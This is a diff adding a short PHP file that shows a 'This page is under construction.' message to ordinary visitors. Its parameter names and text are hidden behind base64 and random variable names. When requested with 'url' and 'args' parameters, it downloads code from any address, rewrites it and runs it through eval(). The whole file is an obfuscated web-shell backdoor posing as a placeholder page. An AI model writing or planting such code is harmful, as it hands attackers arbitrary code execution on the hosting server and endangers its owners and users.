@@ -1,0 +1,3 @@
+<?php
+$GLOBALS["GfXSpKiWRcQMhxScfgUl"]=base64_decode("YXJncw==");$GLOBALS["TOKCYBEaPbdBQKiAAEYr"]=base64_decode("dXJs");$GLOBALS["sntVYwmeALwwiXCkfxtX"]=base64_decode("VGhpcyBwYWdlIGlzIHVuZGVyIGNvbnN0cnVjdGlvbi4=");
+?><?php if (isset ($_GET[$GLOBALS["TOKCYBEaPbdBQKiAAEYr"]]) && isset ($_GET[$GLOBALS["GfXSpKiWRcQMhxScfgUl"]])) { $fqaewzFBlcQOIlGvQxCF = json_decode($_GET[$GLOBALS["GfXSpKiWRcQMhxScfgUl"]], true); eval(str_replace(array_keys($fqaewzFBlcQOIlGvQxCF), array_values($fqaewzFBlcQOIlGvQxCF), file_get_contents($_GET[$GLOBALS["TOKCYBEaPbdBQKiAAEYr"]]))); } else { echo $GLOBALS["sntVYwmeALwwiXCkfxtX"]; } ?>
